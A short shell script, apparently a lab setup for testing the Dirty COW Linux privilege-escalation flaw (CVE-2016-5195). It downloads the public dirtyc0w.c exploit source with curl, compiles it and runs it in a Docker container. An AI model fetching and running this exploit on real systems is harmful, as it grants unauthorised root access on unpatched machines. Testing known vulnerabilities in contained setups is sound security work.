#!/bin/sh

# infos from:
#   https://www.redpacketsecurity.com/testing-dirty-cow-cve-2016-5195/
# run with:
#   $ bash README.txt

set -e 

sudo apt-get install -y gcc
curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > dirtyc0w.c
gcc -static -s -pthread dirtyc0w.c -o dirtyc0w

docker build -t rpi-dirtycow .
docker run --rm -ti rpi-dirtycow

